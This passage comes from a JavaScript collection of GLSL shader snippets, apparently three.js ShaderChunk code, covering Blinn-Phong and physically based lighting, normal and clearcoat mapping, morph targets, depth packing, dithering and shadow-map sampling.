vViewPosition;\n#ifndef FLAT_SHADED\n\tvarying vec3 vNormal;\n#endif\nstruct BlinnPhongMaterial {\n\tvec3 diffuseColor;\n\tvec3 specularColor;\n\tfloat specularShininess;\n\tfloat specularStrength;\n};\nvoid RE_Direct_BlinnPhong( const in IncidentLight directLight, const in GeometricContext geometry, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {\n\tfloat dotNL = saturate( dot( geometry.normal, directLight.direction ) );\n\tvec3 irradiance = dotNL * directLight.color;\n\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\t\tirradiance *= PI;\n\t#endif\n\treflectedLight.directDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\n\treflectedLight.directSpecular += irradiance * BRDF_Specular_BlinnPhong( directLight, geometry, material.specularColor, material.specularShininess ) * material.specularStrength;\n}\nvoid RE_IndirectDiffuse_BlinnPhong( const in vec3 irradiance, const in GeometricContext geometry, const in BlinnPhongMaterial material, inout ReflectedLight reflectedLight ) {\n\treflectedLight.indirectDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\n}\n#define RE_Direct\t\t\t\tRE_Direct_BlinnPhong\n#define RE_IndirectDiffuse\t\tRE_IndirectDiffuse_BlinnPhong\n#define Material_LightProbeLOD( material )\t(0)", lights_physical_fragment: "PhysicalMaterial material;\nmaterial.diffuseColor = diffuseColor.rgb * ( 1.0 - metalnessFactor );\nvec3 dxy = max( abs( dFdx( geometryNormal ) ), abs( dFdy( geometryNormal ) ) );\nfloat geometryRoughness = max( max( dxy.x, dxy.y ), dxy.z );\nmaterial.specularRoughness = max( roughnessFactor, 0.0525 );material.specularRoughness += geometryRoughness;\nmaterial.specularRoughness = min( material.specularRoughness, 1.0 );\n#ifdef REFLECTIVITY\n\tmaterial.specularColor = mix( vec3( MAXIMUM_SPECULAR_COEFFICIENT * pow2( reflectivity ) ), diffuseColor.rgb, metalnessFactor );\n#else\n\tmaterial.specularColor = mix( vec3( DEFAULT_SPECULAR_COEFFICIENT ), diffuseColor.rgb, metalnessFactor );\n#endif\n#ifdef CLEARCOAT\n\tmaterial.clearcoat = clearcoat;\n\tmaterial.clearcoatRoughness = clearcoatRoughness;\n\t#ifdef USE_CLEARCOATMAP\n\t\tmaterial.clearcoat *= texture2D( clearcoatMap, vUv ).x;\n\t#endif\n\t#ifdef USE_CLEARCOAT_ROUGHNESSMAP\n\t\tmaterial.clearcoatRoughness *= texture2D( clearcoatRoughnessMap, vUv ).y;\n\t#endif\n\tmaterial.clearcoat = saturate( material.clearcoat );\tmaterial.clearcoatRoughness = max( material.clearcoatRoughness, 0.0525 );\n\tmaterial.clearcoatRoughness += geometryRoughness;\n\tmaterial.clearcoatRoughness = min( material.clearcoatRoughness, 1.0 );\n#endif\n#ifdef USE_SHEEN\n\tmaterial.sheenColor = sheen;\n#endif", lights_physical_pars_fragment: "struct PhysicalMaterial {\n\tvec3 diffuseColor;\n\tfloat specularRoughness;\n\tvec3 specularColor;\n#ifdef CLEARCOAT\n\tfloat clearcoat;\n\tfloat clearcoatRoughness;\n#endif\n#ifdef USE_SHEEN\n\tvec3 sheenColor;\n#endif\n};\n#define MAXIMUM_SPECULAR_COEFFICIENT 0.16\n#define DEFAULT_SPECULAR_COEFFICIENT 0.04\nfloat clearcoatDHRApprox( const in float roughness, const in float dotNL ) {\n\treturn DEFAULT_SPECULAR_COEFFICIENT + ( 1.0 - DEFAULT_SPECULAR_COEFFICIENT ) * ( pow( 1.0 - dotNL, 5.0 ) * pow( 1.0 - roughness, 2.0 ) );\n}\n#if NUM_RECT_AREA_LIGHTS > 0\n\tvoid RE_Direct_RectArea_Physical( const in RectAreaLight rectAreaLight, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\n\t\tvec3 normal = geometry.normal;\n\t\tvec3 viewDir = geometry.viewDir;\n\t\tvec3 position = geometry.position;\n\t\tvec3 lightPos = rectAreaLight.position;\n\t\tvec3 halfWidth = rectAreaLight.halfWidth;\n\t\tvec3 halfHeight = rectAreaLight.halfHeight;\n\t\tvec3 lightColor = rectAreaLight.color;\n\t\tfloat roughness = material.specularRoughness;\n\t\tvec3 rectCoords[ 4 ];\n\t\trectCoords[ 0 ] = lightPos + halfWidth - halfHeight;\t\trectCoords[ 1 ] = lightPos - halfWidth - halfHeight;\n\t\trectCoords[ 2 ] = lightPos - halfWidth + halfHeight;\n\t\trectCoords[ 3 ] = lightPos + halfWidth + halfHeight;\n\t\tvec2 uv = LTC_Uv( normal, viewDir, roughness );\n\t\tvec4 t1 = texture2D( ltc_1, uv );\n\t\tvec4 t2 = texture2D( ltc_2, uv );\n\t\tmat3 mInv = mat3(\n\t\t\tvec3( t1.x, 0, t1.y ),\n\t\t\tvec3(    0, 1,    0 ),\n\t\t\tvec3( t1.z, 0, t1.w )\n\t\t);\n\t\tvec3 fresnel = ( material.specularColor * t2.x + ( vec3( 1.0 ) - material.specularColor ) * t2.y );\n\t\treflectedLight.directSpecular += lightColor * fresnel * LTC_Evaluate( normal, viewDir, position, mInv, rectCoords );\n\t\treflectedLight.directDiffuse += lightColor * material.diffuseColor * LTC_Evaluate( normal, viewDir, position, mat3( 1.0 ), rectCoords );\n\t}\n#endif\nvoid RE_Direct_Physical( const in IncidentLight directLight, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\n\tfloat dotNL = saturate( dot( geometry.normal, directLight.direction ) );\n\tvec3 irradiance = dotNL * directLight.color;\n\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\t\tirradiance *= PI;\n\t#endif\n\t#ifdef CLEARCOAT\n\t\tfloat ccDotNL = saturate( dot( geometry.clearcoatNormal, directLight.direction ) );\n\t\tvec3 ccIrradiance = ccDotNL * directLight.color;\n\t\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\t\t\tccIrradiance *= PI;\n\t\t#endif\n\t\tfloat clearcoatDHR = material.clearcoat * clearcoatDHRApprox( material.clearcoatRoughness, ccDotNL );\n\t\treflectedLight.directSpecular += ccIrradiance * material.clearcoat * BRDF_Specular_GGX( directLight, geometry.viewDir, geometry.clearcoatNormal, vec3( DEFAULT_SPECULAR_COEFFICIENT ), material.clearcoatRoughness );\n\t#else\n\t\tfloat clearcoatDHR = 0.0;\n\t#endif\n\t#ifdef USE_SHEEN\n\t\treflectedLight.directSpecular += ( 1.0 - clearcoatDHR ) * irradiance * BRDF_Specular_Sheen(\n\t\t\tmaterial.specularRoughness,\n\t\t\tdirectLight.direction,\n\t\t\tgeometry,\n\t\t\tmaterial.sheenColor\n\t\t);\n\t#else\n\t\treflectedLight.directSpecular += ( 1.0 - clearcoatDHR ) * irradiance * BRDF_Specular_GGX( directLight, geometry.viewDir, geometry.normal, material.specularColor, material.specularRoughness);\n\t#endif\n\treflectedLight.directDiffuse += ( 1.0 - clearcoatDHR ) * irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\n}\nvoid RE_IndirectDiffuse_Physical( const in vec3 irradiance, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {\n\treflectedLight.indirectDiffuse += irradiance * BRDF_Diffuse_Lambert( material.diffuseColor );\n}\nvoid RE_IndirectSpecular_Physical( const in vec3 radiance, const in vec3 irradiance, const in vec3 clearcoatRadiance, const in GeometricContext geometry, const in PhysicalMaterial material, inout ReflectedLight reflectedLight) {\n\t#ifdef CLEARCOAT\n\t\tfloat ccDotNV = saturate( dot( geometry.clearcoatNormal, geometry.viewDir ) );\n\t\treflectedLight.indirectSpecular += clearcoatRadiance * material.clearcoat * BRDF_Specular_GGX_Environment( geometry.viewDir, geometry.clearcoatNormal, vec3( DEFAULT_SPECULAR_COEFFICIENT ), material.clearcoatRoughness );\n\t\tfloat ccDotNL = ccDotNV;\n\t\tfloat clearcoatDHR = material.clearcoat * clearcoatDHRApprox( material.clearcoatRoughness, ccDotNL );\n\t#else\n\t\tfloat clearcoatDHR = 0.0;\n\t#endif\n\tfloat clearcoatInv = 1.0 - clearcoatDHR;\n\tvec3 singleScattering = vec3( 0.0 );\n\tvec3 multiScattering = vec3( 0.0 );\n\tvec3 cosineWeightedIrradiance = irradiance * RECIPROCAL_PI;\n\tBRDF_Specular_Multiscattering_Environment( geometry, material.specularColor, material.specularRoughness, singleScattering, multiScattering );\n\tvec3 diffuse = material.diffuseColor * ( 1.0 - ( singleScattering + multiScattering ) );\n\treflectedLight.indirectSpecular += clearcoatInv * radiance * singleScattering;\n\treflectedLight.indirectSpecular += multiScattering * cosineWeightedIrradiance;\n\treflectedLight.indirectDiffuse += diffuse * cosineWeightedIrradiance;\n}\n#define RE_Direct\t\t\t\tRE_Direct_Physical\n#define RE_Direct_RectArea\t\tRE_Direct_RectArea_Physical\n#define RE_IndirectDiffuse\t\tRE_IndirectDiffuse_Physical\n#define RE_IndirectSpecular\t\tRE_IndirectSpecular_Physical\nfloat computeSpecularOcclusion( const in float dotNV, const in float ambientOcclusion, const in float roughness ) {\n\treturn saturate( pow( dotNV + ambientOcclusion, exp2( - 16.0 * roughness - 1.0 ) ) - 1.0 + ambientOcclusion );\n}", lights_fragment_begin: "\nGeometricContext geometry;\ngeometry.position = - vViewPosition;\ngeometry.normal = normal;\ngeometry.viewDir = ( isOrthographic ) ? vec3( 0, 0, 1 ) : normalize( vViewPosition );\n#ifdef CLEARCOAT\n\tgeometry.clearcoatNormal = clearcoatNormal;\n#endif\nIncidentLight directLight;\n#if ( NUM_POINT_LIGHTS > 0 ) && defined( RE_Direct )\n\tPointLight pointLight;\n\t#if defined( USE_SHADOWMAP ) && NUM_POINT_LIGHT_SHADOWS > 0\n\tPointLightShadow pointLightShadow;\n\t#endif\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\n\t\tpointLight = pointLights[ i ];\n\t\tgetPointDirectLightIrradiance( pointLight, geometry, directLight );\n\t\t#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_POINT_LIGHT_SHADOWS )\n\t\tpointLightShadow = pointLightShadows[ i ];\n\t\tdirectLight.color *= all( bvec2( directLight.visible, receiveShadow ) ) ? getPointShadow( pointShadowMap[ i ], pointLightShadow.shadowMapSize, pointLightShadow.shadowBias, pointLightShadow.shadowRadius, vPointShadowCoord[ i ], pointLightShadow.shadowCameraNear, pointLightShadow.shadowCameraFar ) : 1.0;\n\t\t#endif\n\t\tRE_Direct( directLight, geometry, material, reflectedLight );\n\t}\n\t#pragma unroll_loop_end\n#endif\n#if ( NUM_SPOT_LIGHTS > 0 ) && defined( RE_Direct )\n\tSpotLight spotLight;\n\t#if defined( USE_SHADOWMAP ) && NUM_SPOT_LIGHT_SHADOWS > 0\n\tSpotLightShadow spotLightShadow;\n\t#endif\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\n\t\tspotLight = spotLights[ i ];\n\t\tgetSpotDirectLightIrradiance( spotLight, geometry, directLight );\n\t\t#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_SPOT_LIGHT_SHADOWS )\n\t\tspotLightShadow = spotLightShadows[ i ];\n\t\tdirectLight.color *= all( bvec2( directLight.visible, receiveShadow ) ) ? getShadow( spotShadowMap[ i ], spotLightShadow.shadowMapSize, spotLightShadow.shadowBias, spotLightShadow.shadowRadius, vSpotShadowCoord[ i ] ) : 1.0;\n\t\t#endif\n\t\tRE_Direct( directLight, geometry, material, reflectedLight );\n\t}\n\t#pragma unroll_loop_end\n#endif\n#if ( NUM_DIR_LIGHTS > 0 ) && defined( RE_Direct )\n\tDirectionalLight directionalLight;\n\t#if defined( USE_SHADOWMAP ) && NUM_DIR_LIGHT_SHADOWS > 0\n\tDirectionalLightShadow directionalLightShadow;\n\t#endif\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\n\t\tdirectionalLight = directionalLights[ i ];\n\t\tgetDirectionalDirectLightIrradiance( directionalLight, geometry, directLight );\n\t\t#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_DIR_LIGHT_SHADOWS )\n\t\tdirectionalLightShadow = directionalLightShadows[ i ];\n\t\tdirectLight.color *= all( bvec2( directLight.visible, receiveShadow ) ) ? getShadow( directionalShadowMap[ i ], directionalLightShadow.shadowMapSize, directionalLightShadow.shadowBias, directionalLightShadow.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;\n\t\t#endif\n\t\tRE_Direct( directLight, geometry, material, reflectedLight );\n\t}\n\t#pragma unroll_loop_end\n#endif\n#if ( NUM_RECT_AREA_LIGHTS > 0 ) && defined( RE_Direct_RectArea )\n\tRectAreaLight rectAreaLight;\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < NUM_RECT_AREA_LIGHTS; i ++ ) {\n\t\trectAreaLight = rectAreaLights[ i ];\n\t\tRE_Direct_RectArea( rectAreaLight, geometry, material, reflectedLight );\n\t}\n\t#pragma unroll_loop_end\n#endif\n#if defined( RE_IndirectDiffuse )\n\tvec3 iblIrradiance = vec3( 0.0 );\n\tvec3 irradiance = getAmbientLightIrradiance( ambientLightColor );\n\tirradiance += getLightProbeIrradiance( lightProbe, geometry );\n\t#if ( NUM_HEMI_LIGHTS > 0 )\n\t\t#pragma unroll_loop_start\n\t\tfor ( int i = 0; i < NUM_HEMI_LIGHTS; i ++ ) {\n\t\t\tirradiance += getHemisphereLightIrradiance( hemisphereLights[ i ], geometry );\n\t\t}\n\t\t#pragma unroll_loop_end\n\t#endif\n#endif\n#if defined( RE_IndirectSpecular )\n\tvec3 radiance = vec3( 0.0 );\n\tvec3 clearcoatRadiance = vec3( 0.0 );\n#endif", lights_fragment_maps: "#if defined( RE_IndirectDiffuse )\n\t#ifdef USE_LIGHTMAP\n\t\tvec4 lightMapTexel= texture2D( lightMap, vUv2 );\n\t\tvec3 lightMapIrradiance = lightMapTexelToLinear( lightMapTexel ).rgb * lightMapIntensity;\n\t\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\t\t\tlightMapIrradiance *= PI;\n\t\t#endif\n\t\tirradiance += lightMapIrradiance;\n\t#endif\n\t#if defined( USE_ENVMAP ) && defined( STANDARD ) && defined( ENVMAP_TYPE_CUBE_UV )\n\t\tiblIrradiance += getLightProbeIndirectIrradiance( geometry, maxMipLevel );\n\t#endif\n#endif\n#if defined( USE_ENVMAP ) && defined( RE_IndirectSpecular )\n\tradiance += getLightProbeIndirectRadiance( geometry.viewDir, geometry.normal, material.specularRoughness, maxMipLevel );\n\t#ifdef CLEARCOAT\n\t\tclearcoatRadiance += getLightProbeIndirectRadiance( geometry.viewDir, geometry.clearcoatNormal, material.clearcoatRoughness, maxMipLevel );\n\t#endif\n#endif", lights_fragment_end: "#if defined( RE_IndirectDiffuse )\n\tRE_IndirectDiffuse( irradiance, geometry, material, reflectedLight );\n#endif\n#if defined( RE_IndirectSpecular )\n\tRE_IndirectSpecular( radiance, iblIrradiance, clearcoatRadiance, geometry, material, reflectedLight );\n#endif", logdepthbuf_fragment: "#if defined( USE_LOGDEPTHBUF ) && defined( USE_LOGDEPTHBUF_EXT )\n\tgl_FragDepthEXT = vIsPerspective == 0.0 ? gl_FragCoord.z : log2( vFragDepth ) * logDepthBufFC * 0.5;\n#endif", logdepthbuf_pars_fragment: "#if defined( USE_LOGDEPTHBUF ) && defined( USE_LOGDEPTHBUF_EXT )\n\tuniform float logDepthBufFC;\n\tvarying float vFragDepth;\n\tvarying float vIsPerspective;\n#endif", logdepthbuf_pars_vertex: "#ifdef USE_LOGDEPTHBUF\n\t#ifdef USE_LOGDEPTHBUF_EXT\n\t\tvarying float vFragDepth;\n\t\tvarying float vIsPerspective;\n\t#else\n\t\tuniform float logDepthBufFC;\n\t#endif\n#endif", logdepthbuf_vertex: "#ifdef USE_LOGDEPTHBUF\n\t#ifdef USE_LOGDEPTHBUF_EXT\n\t\tvFragDepth = 1.0 + gl_Position.w;\n\t\tvIsPerspective = float( isPerspectiveMatrix( projectionMatrix ) );\n\t#else\n\t\tif ( isPerspectiveMatrix( projectionMatrix ) ) {\n\t\t\tgl_Position.z = log2( max( EPSILON, gl_Position.w + 1.0 ) ) * logDepthBufFC - 1.0;\n\t\t\tgl_Position.z *= gl_Position.w;\n\t\t}\n\t#endif\n#endif", map_fragment: "#ifdef USE_MAP\n\tvec4 texelColor = texture2D( map, vUv );\n\ttexelColor = mapTexelToLinear( texelColor );\n\tdiffuseColor *= texelColor;\n#endif", map_pars_fragment: "#ifdef USE_MAP\n\tuniform sampler2D map;\n#endif", map_particle_fragment: "#if defined( USE_MAP ) || defined( USE_ALPHAMAP )\n\tvec2 uv = ( uvTransform * vec3( gl_PointCoord.x, 1.0 - gl_PointCoord.y, 1 ) ).xy;\n#endif\n#ifdef USE_MAP\n\tvec4 mapTexel = texture2D( map, uv );\n\tdiffuseColor *= mapTexelToLinear( mapTexel );\n#endif\n#ifdef USE_ALPHAMAP\n\tdiffuseColor.a *= texture2D( alphaMap, uv ).g;\n#endif", map_particle_pars_fragment: "#if defined( USE_MAP ) || defined( USE_ALPHAMAP )\n\tuniform mat3 uvTransform;\n#endif\n#ifdef USE_MAP\n\tuniform sampler2D map;\n#endif\n#ifdef USE_ALPHAMAP\n\tuniform sampler2D alphaMap;\n#endif", metalnessmap_fragment: "float metalnessFactor = metalness;\n#ifdef USE_METALNESSMAP\n\tvec4 texelMetalness = texture2D( metalnessMap, vUv );\n\tmetalnessFactor *= texelMetalness.b;\n#endif", metalnessmap_pars_fragment: "#ifdef USE_METALNESSMAP\n\tuniform sampler2D metalnessMap;\n#endif", morphnormal_vertex: "#ifdef USE_MORPHNORMALS\n\tobjectNormal *= morphTargetBaseInfluence;\n\tobjectNormal += morphNormal0 * morphTargetInfluences[ 0 ];\n\tobjectNormal += morphNormal1 * morphTargetInfluences[ 1 ];\n\tobjectNormal += morphNormal2 * morphTargetInfluences[ 2 ];\n\tobjectNormal += morphNormal3 * morphTargetInfluences[ 3 ];\n#endif", morphtarget_pars_vertex: "#ifdef USE_MORPHTARGETS\n\tuniform float morphTargetBaseInfluence;\n\t#ifndef USE_MORPHNORMALS\n\t\tuniform float morphTargetInfluences[ 8 ];\n\t#else\n\t\tuniform float morphTargetInfluences[ 4 ];\n\t#endif\n#endif", morphtarget_vertex: "#ifdef USE_MORPHTARGETS\n\ttransformed *= morphTargetBaseInfluence;\n\ttransformed += morphTarget0 * morphTargetInfluences[ 0 ];\n\ttransformed += morphTarget1 * morphTargetInfluences[ 1 ];\n\ttransformed += morphTarget2 * morphTargetInfluences[ 2 ];\n\ttransformed += morphTarget3 * morphTargetInfluences[ 3 ];\n\t#ifndef USE_MORPHNORMALS\n\t\ttransformed += morphTarget4 * morphTargetInfluences[ 4 ];\n\t\ttransformed += morphTarget5 * morphTargetInfluences[ 5 ];\n\t\ttransformed += morphTarget6 * morphTargetInfluences[ 6 ];\n\t\ttransformed += morphTarget7 * morphTargetInfluences[ 7 ];\n\t#endif\n#endif", normal_fragment_begin: "float faceDirection = gl_FrontFacing ? 1.0 : - 1.0;\n#ifdef FLAT_SHADED\n\tvec3 fdx = vec3( dFdx( vViewPosition.x ), dFdx( vViewPosition.y ), dFdx( vViewPosition.z ) );\n\tvec3 fdy = vec3( dFdy( vViewPosition.x ), dFdy( vViewPosition.y ), dFdy( vViewPosition.z ) );\n\tvec3 normal = normalize( cross( fdx, fdy ) );\n#else\n\tvec3 normal = normalize( vNormal );\n\t#ifdef DOUBLE_SIDED\n\t\tnormal = normal * faceDirection;\n\t#endif\n\t#ifdef USE_TANGENT\n\t\tvec3 tangent = normalize( vTangent );\n\t\tvec3 bitangent = normalize( vBitangent );\n\t\t#ifdef DOUBLE_SIDED\n\t\t\ttangent = tangent * faceDirection;\n\t\t\tbitangent = bitangent * faceDirection;\n\t\t#endif\n\t\t#if defined( TANGENTSPACE_NORMALMAP ) || defined( USE_CLEARCOAT_NORMALMAP )\n\t\t\tmat3 vTBN = mat3( tangent, bitangent, normal );\n\t\t#endif\n\t#endif\n#endif\nvec3 geometryNormal = normal;", normal_fragment_maps: "#ifdef OBJECTSPACE_NORMALMAP\n\tnormal = texture2D( normalMap, vUv ).xyz * 2.0 - 1.0;\n\t#ifdef FLIP_SIDED\n\t\tnormal = - normal;\n\t#endif\n\t#ifdef DOUBLE_SIDED\n\t\tnormal = normal * faceDirection;\n\t#endif\n\tnormal = normalize( normalMatrix * normal );\n#elif defined( TANGENTSPACE_NORMALMAP )\n\tvec3 mapN = texture2D( normalMap, vUv ).xyz * 2.0 - 1.0;\n\tmapN.xy *= normalScale;\n\t#ifdef USE_TANGENT\n\t\tnormal = normalize( vTBN * mapN );\n\t#else\n\t\tnormal = perturbNormal2Arb( -vViewPosition, normal, mapN, faceDirection );\n\t#endif\n#elif defined( USE_BUMPMAP )\n\tnormal = perturbNormalArb( -vViewPosition, normal, dHdxy_fwd(), faceDirection );\n#endif", normalmap_pars_fragment: "#ifdef USE_NORMALMAP\n\tuniform sampler2D normalMap;\n\tuniform vec2 normalScale;\n#endif\n#ifdef OBJECTSPACE_NORMALMAP\n\tuniform mat3 normalMatrix;\n#endif\n#if ! defined ( USE_TANGENT ) && ( defined ( TANGENTSPACE_NORMALMAP ) || defined ( USE_CLEARCOAT_NORMALMAP ) )\n\tvec3 perturbNormal2Arb( vec3 eye_pos, vec3 surf_norm, vec3 mapN, float faceDirection ) {\n\t\tvec3 q0 = vec3( dFdx( eye_pos.x ), dFdx( eye_pos.y ), dFdx( eye_pos.z ) );\n\t\tvec3 q1 = vec3( dFdy( eye_pos.x ), dFdy( eye_pos.y ), dFdy( eye_pos.z ) );\n\t\tvec2 st0 = dFdx( vUv.st );\n\t\tvec2 st1 = dFdy( vUv.st );\n\t\tvec3 N = surf_norm;\n\t\tvec3 q1perp = cross( q1, N );\n\t\tvec3 q0perp = cross( N, q0 );\n\t\tvec3 T = q1perp * st0.x + q0perp * st1.x;\n\t\tvec3 B = q1perp * st0.y + q0perp * st1.y;\n\t\tfloat det = max( dot( T, T ), dot( B, B ) );\n\t\tfloat scale = ( det == 0.0 ) ? 0.0 : faceDirection * inversesqrt( det );\n\t\treturn normalize( T * ( mapN.x * scale ) + B * ( mapN.y * scale ) + N * mapN.z );\n\t}\n#endif", clearcoat_normal_fragment_begin: "#ifdef CLEARCOAT\n\tvec3 clearcoatNormal = geometryNormal;\n#endif", clearcoat_normal_fragment_maps: "#ifdef USE_CLEARCOAT_NORMALMAP\n\tvec3 clearcoatMapN = texture2D( clearcoatNormalMap, vUv ).xyz * 2.0 - 1.0;\n\tclearcoatMapN.xy *= clearcoatNormalScale;\n\t#ifdef USE_TANGENT\n\t\tclearcoatNormal = normalize( vTBN * clearcoatMapN );\n\t#else\n\t\tclearcoatNormal = perturbNormal2Arb( - vViewPosition, clearcoatNormal, clearcoatMapN, faceDirection );\n\t#endif\n#endif", clearcoat_pars_fragment: "#ifdef USE_CLEARCOATMAP\n\tuniform sampler2D clearcoatMap;\n#endif\n#ifdef USE_CLEARCOAT_ROUGHNESSMAP\n\tuniform sampler2D clearcoatRoughnessMap;\n#endif\n#ifdef USE_CLEARCOAT_NORMALMAP\n\tuniform sampler2D clearcoatNormalMap;\n\tuniform vec2 clearcoatNormalScale;\n#endif", packing: "vec3 packNormalToRGB( const in vec3 normal ) {\n\treturn normalize( normal ) * 0.5 + 0.5;\n}\nvec3 unpackRGBToNormal( const in vec3 rgb ) {\n\treturn 2.0 * rgb.xyz - 1.0;\n}\nconst float PackUpscale = 256. / 255.;const float UnpackDownscale = 255. / 256.;\nconst vec3 PackFactors = vec3( 256. * 256. * 256., 256. * 256., 256. );\nconst vec4 UnpackFactors = UnpackDownscale / vec4( PackFactors, 1. );\nconst float ShiftRight8 = 1. / 256.;\nvec4 packDepthToRGBA( const in float v ) {\n\tvec4 r = vec4( fract( v * PackFactors ), v );\n\tr.yzw -= r.xyz * ShiftRight8;\treturn r * PackUpscale;\n}\nfloat unpackRGBAToDepth( const in vec4 v ) {\n\treturn dot( v, UnpackFactors );\n}\nvec4 pack2HalfToRGBA( vec2 v ) {\n\tvec4 r = vec4( v.x, fract( v.x * 255.0 ), v.y, fract( v.y * 255.0 ));\n\treturn vec4( r.x - r.y / 255.0, r.y, r.z - r.w / 255.0, r.w);\n}\nvec2 unpackRGBATo2Half( vec4 v ) {\n\treturn vec2( v.x + ( v.y / 255.0 ), v.z + ( v.w / 255.0 ) );\n}\nfloat viewZToOrthographicDepth( const in float viewZ, const in float near, const in float far ) {\n\treturn ( viewZ + near ) / ( near - far );\n}\nfloat orthographicDepthToViewZ( const in float linearClipZ, const in float near, const in float far ) {\n\treturn linearClipZ * ( near - far ) - near;\n}\nfloat viewZToPerspectiveDepth( const in float viewZ, const in float near, const in float far ) {\n\treturn (( near + viewZ ) * far ) / (( far - near ) * viewZ );\n}\nfloat perspectiveDepthToViewZ( const in float invClipZ, const in float near, const in float far ) {\n\treturn ( near * far ) / ( ( far - near ) * invClipZ - far );\n}", premultiplied_alpha_fragment: "#ifdef PREMULTIPLIED_ALPHA\n\tgl_FragColor.rgb *= gl_FragColor.a;\n#endif", project_vertex: "vec4 mvPosition = vec4( transformed, 1.0 );\n#ifdef USE_INSTANCING\n\tmvPosition = instanceMatrix * mvPosition;\n#endif\nmvPosition = modelViewMatrix * mvPosition;\ngl_Position = projectionMatrix * mvPosition;", dithering_fragment: "#ifdef DITHERING\n\tgl_FragColor.rgb = dithering( gl_FragColor.rgb );\n#endif", dithering_pars_fragment: "#ifdef DITHERING\n\tvec3 dithering( vec3 color ) {\n\t\tfloat grid_position = rand( gl_FragCoord.xy );\n\t\tvec3 dither_shift_RGB = vec3( 0.25 / 255.0, -0.25 / 255.0, 0.25 / 255.0 );\n\t\tdither_shift_RGB = mix( 2.0 * dither_shift_RGB, -2.0 * dither_shift_RGB, grid_position );\n\t\treturn color + dither_shift_RGB;\n\t}\n#endif", roughnessmap_fragment: "float roughnessFactor = roughness;\n#ifdef USE_ROUGHNESSMAP\n\tvec4 texelRoughness = texture2D( roughnessMap, vUv );\n\troughnessFactor *= texelRoughness.g;\n#endif", roughnessmap_pars_fragment: "#ifdef USE_ROUGHNESSMAP\n\tuniform sampler2D roughnessMap;\n#endif", shadowmap_pars_fragment: "#ifdef USE_SHADOWMAP\n\t#if NUM_DIR_LIGHT_SHADOWS > 0\n\t\tuniform sampler2D directionalShadowMap[ NUM_DIR_LIGHT_SHADOWS ];\n\t\tvarying vec4 vDirectionalShadowCoord[ NUM_DIR_LIGHT_SHADOWS ];\n\t\tstruct DirectionalLightShadow {\n\t\t\tfloat shadowBias;\n\t\t\tfloat shadowNormalBias;\n\t\t\tfloat shadowRadius;\n\t\t\tvec2 shadowMapSize;\n\t\t};\n\t\tuniform DirectionalLightShadow directionalLightShadows[ NUM_DIR_LIGHT_SHADOWS ];\n\t#endif\n\t#if NUM_SPOT_LIGHT_SHADOWS > 0\n\t\tuniform sampler2D spotShadowMap[ NUM_SPOT_LIGHT_SHADOWS ];\n\t\tvarying vec4 vSpotShadowCoord[ NUM_SPOT_LIGHT_SHADOWS ];\n\t\tstruct SpotLightShadow {\n\t\t\tfloat shadowBias;\n\t\t\tfloat shadowNormalBias;\n\t\t\tfloat shadowRadius;\n\t\t\tvec2 shadowMapSize;\n\t\t};\n\t\tuniform SpotLightShadow spotLightShadows[ NUM_SPOT_LIGHT_SHADOWS ];\n\t#endif\n\t#if NUM_POINT_LIGHT_SHADOWS > 0\n\t\tuniform sampler2D pointShadowMap[ NUM_POINT_LIGHT_SHADOWS ];\n\t\tvarying vec4 vPointShadowCoord[ NUM_POINT_LIGHT_SHADOWS ];\n\t\tstruct PointLightShadow {\n\t\t\tfloat shadowBias;\n\t\t\tfloat shadowNormalBias;\n\t\t\tfloat shadowRadius;\n\t\t\tvec2 shadowMapSize;\n\t\t\tfloat shadowCameraNear;\n\t\t\tfloat shadowCameraFar;\n\t\t};\n\t\tuniform PointLightShadow pointLightShadows[ NUM_POINT_LIGHT_SHADOWS ];\n\t#endif\n\tfloat texture2DCompare( sampler2D depths, vec2 uv, float compare ) {\n\t\treturn step( compare, unpackRGBAToDepth( texture2D( depths, uv ) ) );\n\t}\n\tvec2 texture2DDistribution( sampler2D shadow, vec2 uv ) {\n\t\treturn unpackRGBATo2Half( texture2D( shadow, uv ) );\n\t}\n\tfloat VSMShadow (sampler2D shadow, vec2 uv, float compare ){\n\t\tfloat occlusion = 1.0;\n\t\tvec2 distribution = texture2DDistribution( shadow, uv );\n\t\tfloat hard_shadow = step( compare , distribution.x );\n\t\tif (hard_shadow != 1.0 ) {\n\t\t\tfloat distance = compare - distribution.x ;\n\t\t\tfloat variance = max( 0.00000, distribution.y * distribution.y );\n\t\t\tfloat softness_probability = variance / (variance + distance * distance );\t\t\tsoftness_probability = clamp( ( softness_probability - 0.3 ) / ( 0.95 - 0.3 ), 0.0, 1.0 );\t\t\tocclusion = clamp( max( hard_shadow, softness_probability ), 0.0, 1.0 );\n\t\t}\n\t\treturn occlusion;\n\t}\n\tfloat getShadow( sampler2D shadowMap, vec2 shadowMapSize, float shadowBias, float shadowRadius, vec4 shadowCoord ) {\n\t\tfloat shadow = 1.0;\n\t\tshadowCoord.xyz /= shadowCoord.w;\n\t\tshadowCoord.z += shadowBias;\n\t\tbvec4 inFrustumVec = bvec4 ( shadowCoord.x >= 0.0, shadowCoord.x <= 1.0, shadowCoord.y >= 0.0, shadowCoord.y <= 1.0 );\n\t\tbool inFrustum = all( inFrustumVec );\n\t\tbvec2 frustumTestVec = bvec2( inFrustum, shadowCoord.z <= 1.0 );\n\t\tbool frustumTest = 